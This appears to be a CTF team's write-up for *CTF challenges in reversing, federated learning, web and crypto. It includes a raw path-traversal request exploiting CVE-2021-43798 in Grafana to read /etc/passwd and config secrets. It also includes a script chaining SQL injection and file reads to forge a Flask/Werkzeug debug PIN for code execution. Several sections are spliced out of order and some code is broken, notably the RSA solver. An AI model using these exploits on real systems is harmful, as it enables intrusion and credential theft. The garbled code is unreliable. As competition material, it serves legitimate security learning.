# CDEFGHIJKLMNOPQRSTUV3201WX456789AB
# DEFGHIJKLMNOPQRSTUV3201WX456789ABC
# EFGHIJKLMNOPQRSTUV3201WX456789ABCD
# FGHIJKLMNOPQRSTUV3201WX456789ABCDE
# GHIJKLMNOPQRSTUV3201WX456789ABCDEF
# HIJKLMNOPQRSTUV3201WX456789ABCDEFG
# IJKLMNOPQRSTUV3201WX456789ABCDEFGH
# JKLMNOPQRSTUV3201WX456789ABCDEFGHI
# KLMNOPQRSTUV3201WX456789ABCDEFGHIJ
Misc
# LMNOPQRSTUV3201WX456789ABCDEFGHIJK
# MNOPQRSTUV3201WX456789ABCDEFGHIJKL
# NOPQRSTUV3201WX456789ABCDEFGHIJKLM
# OPQRSTUV3201WX456789ABCDEFGHIJKLMN
# PQRSTUV3201WX456789ABCDEFGHIJKLMNO
# QRSTUV3201WX456789ABCDEFGHIJKLMNOP
# RSTUV3201WX456789ABCDEFGHIJKLMNOPQ
# STUV3201WX456789ABCDEFGHIJKLMNOPQR
# TUV3201WX456789ABCDEFGHIJKLMNOPQRS
# UV3201WX456789ABCDEFGHIJKLMNOPQRST
# V3201WX456789ABCDEFGHIJKLMNOPQRSTU
# WX456789ABCDEFGHIJKLMNOPQRSTUV3201
# X456789ABCDEFGHIJKLMNOPQRSTUV3201W
# 输⼊ 32 个字符 flag，题⽬拼接 \x03flag\x02 ⼀共34个字符
# 循环34次，每次记录循环左移1字节结果到数组 arr，如下例⼦(\x02 ⽤ 2 替代，\x03 ⽤ 3 替代 ):
# 201WX456789ABCDEFGHIJKLMNOPQRSTUV3  
# 01WX456789ABCDEFGHIJKLMNOPQRSTUV32  
# 1WX456789ABCDEFGHIJKLMNOPQRSTUV320  
# WX456789ABCDEFGHIJKLMNOPQRSTUV3201  
# X456789ABCDEFGHIJKLMNOPQRSTUV3201W   
# .....
# 对 arr 字符串升序排序，得到 arr2。
# 取 arr2 最后⼀个字符，构成⽐较数组
# ⽐较数据：\x03 jmGn_=uaSZLvN4wFxE6R+p \x02 D2qV1CBTck
data = list('\x03jmGn_=uaSZLvN4wFxE6R+p\x02D2qV1CBTck')
data_s = sorted(data)
m = {}
flag = ['?']*34
for x,y in zip(data_s, data):
    m[x] = y
idx = 0
cur = '\x02'
for _ in range(34):
    flag[idx] = cur
    idx = (idx+33)%34
    cur = m[cur]
    print(''.join(flag))
Alice's warm up
Today
社⼯题
kaggle→twitter→google map
BabyFL
题⽬实现了⼀个naive的fl场景，选⼿扮演⼀个恶意参与者。直接在⽬标测试集上train⼀个攻击模型，将模型参数乘
以⼀个较⼤的scalar后提交即可。
import torch
import torch.nn as nn
import string
flagset=string.printable[0:36]+"*CTF{ALIZE}"
class AliceNet1(nn.Module):
    def __init__(self, ):
        super(Alice, self).__init__()
        self.fc = nn.sequential(
            nn.Linear(47, 47),
            nn.Linear(47, 10),
            nn.Linear(10, 1),
        )
    def forward(self, x):
        x = self.fc(x)
        return x
d = torch.load('0bdb74e42cdf4a42923ccf40d2a66313.zip')
mat = d.fc[0].weight.detach().numpy().astype(int)
start = flagset.index("*")
def dfs(flag):
    if len(flag) == 16:
        if flag[-1] == flagset.index("}"):
            print(flag)
            print(''.join(map(lambda x:flagset[x],flag)))
        return
    for i in range(len(flagset)):
        if mat[flag[-1]][i] == 1:
            dfs(flag+[i])
dfs([start])
Alice's challenge
gradient inversion attack
参考https://github.com/SaurabSS/GradientAttacksinFL实现即可。
checkin
签到
Web
oh-my-grafana
*CVE-2021-43798*
数据库⽂件/var/lib/grafana/grafana.db
读配置⽂件：/etc/grafana/grafana.ini
GET /public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd 
HTTP/1.1
Host: 124.71.184.1:3000
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like 
Gecko) Chrome/100.0.4896.88 Safari/537.36
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,
*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: redirect_to=%2F
Connection: close
# default admin user, created on startup
admin_user = admin
# default admin password, can be changed before first start of grafana,  or in profile 
settings
admin_password = 5f989714e132c9b04d4807dafeb10ade
oh-my-notepro
开了console
http://123.60.72.85:5002/view?note_id=1' union select 1,2,3,4,5%23
能注⼊
import requests as req
import uuid
import re
headers = 
{'Cookie':'session=eyJjc3JmX3Rva2VuIjoiZTIyOGVhYzM3NWZjMWU0ZTIzZjkyZjI0MzFiZGNmNTMwMzUx
ODlhNCIsInVzZXJuYW1lIjoiYWRtaW4xJ29yJzEnPScxIn0.YlpRuA.eXl2Ll2Fd4pH0xkzavcA2AWWN3Q'}
tb = uuid.uuid4().hex
req.get(f"http://121.37.153.47:5002/view?note_id=';create table {tb}(a 
text);%23",headers=headers)
req.get(f"http://121.37.153.47:5002/view?note_id=';load data local infile 
'/proc/self/cgroup' into table ctf.{tb};%23",headers=headers)
res = req.get(f"http://121.37.153.47:5002/view?note_id=' union select 1,2,3,(select a 
from ctf.{tb} limit 0,1),5;%23",headers=headers)
cgroup = res.text.split('\n')[-8].strip().rpartition("/")[2]
print('cgroup',cgroup)
tb = uuid.uuid4().hex
req.get(f"http://121.37.153.47:5002/view?note_id=';create table {tb}(a 
text);%23",headers=headers)
req.get(f"http://121.37.153.47:5002/view?note_id=';load data local infile 
'/sys/class/net/eth0/address' into table ctf.{tb};%23",headers=headers)
res = req.get(f"http://121.37.153.47:5002/view?note_id=' union select 1,2,3,(select a 
from ctf.{tb} limit 0,1),5;%23",headers=headers)
mac = res.text.split('\n')[-8].strip()
print('mac',mac)
mac = str(int(mac.replace(":", ""), 16))
print('mac',mac)
tb = uuid.uuid4().hex
req.get(f"http://121.37.153.47:5002/view?note_id=';create table {tb}(a 
text);%23",headers=headers)
req.get(f"http://121.37.153.47:5002/view?note_id=';load data local infile 
'/etc/machine-id' into table ctf.{tb};%23",headers=headers)
res = req.get(f"http://121.37.153.47:5002/view?note_id=' union select 1,2,3,(select a 
from ctf.{tb} limit 0,1),5;%23",headers=headers)
boot_id = res.text.split('\n')[-8].strip()
print('boot_id',boot_id)
import hashlib
from itertools import chain
probably_public_bits = [
    'ctf',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', 
None),
]
private_bits = [
    mac,# str(uuid.getnode()),  /sys/class/net/ens33/address
    boot_id+cgroup# get_machine_id(), /etc/machine-id
]
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
cookie_name = '__wzd' + h.hexdigest()[:20]
num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]
rv =None
拿到pin之后执⾏/readflag
oh-my-lotto
上传WGETRC并利⽤
oh-my-lotto-revenge
上传gconv-modules并利⽤GCONV_PATH
Crypto
ezRSA
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num
print(rv)
n = 
0xe78ab40c343d4985c1de167e80ba2657c7ee8c2e26d88e0026b68fe400224a3bd7e2a7103c3b01ea4d171
f5cf68c8f00a64304630e07341cde0bc74ef5c88dcbb9822765df53182e3f57153b5f93ff857d496c6561c3
ddbe0ce6ff64ba11d4edfc18a0350c3d0e1f8bd11b3560a111d3a3178ed4a28579c4f1e0dc17cb02c3ac38a
66a230ba9a2f741f9168641c8ce28a3a8c33d523553864f014752a04737e555213f253a72f158893f80e631
de2f55d1d0b2b654fc7fa4d5b3d95617e8253573967de68f6178f78bb7c4788a3a1e9778cbfc7c7fa8beffe
24276b9ad85b11eed01b872b74cdc44959059c67c18b0b7a1d57512319a5e84a9a0735fa536f1b3
c = 
0xd7f6c90512bc9494370c3955ff3136bb245a6d1095e43d8636f66f11db525f2063b14b2a4363a96e6eb1b
ea1e9b2cc62b0cae7659f18f2b8e41fca557281a1e859e8e6b35bd114655b6bf5e454753653309a794fa52f
f2e79433ca4bbeb1ab9a78ec49f49ebee2636abd9dd9b80306ae1b87a86c8012211bda88e6e14c58805feb6
721a01481d1a7031eb3333375a81858ff3b58d8837c188ffcb982a631e1a7a603b947a6984bd78516c71cfc
737aaba479688d56df2c0952deaf496a4eb3f603a46a90efbe9e82a6aef8cfb23e5fcb938c9049b227b7f15
c878bd99b61b6c56db7dfff43cd457429d5dcdb5fe314f1cdf317d0c5202bad6a9770076e9b25b1
s = ((int(n**(1/2))>>899)+1)1:
    m = (l+r)>>1
    if (m+n/m)>s:
        l = m
    else:
        r = m
InverseProblem2
print(m)
PR. = PolynomialRing(Zmod(n))
f = x + m
p0 = f.small_roots(X=2**424,beta=0.48)
p = p0[0] + m
print(p)
q = int(n/p)
d = int(pow(65537,-1,(p-1)*(q-1)))
m = int(pow(c,d,n))
print(m.to_bytes(50,'big'))
*CTF{St.Diana_pls_take_me_with_you!}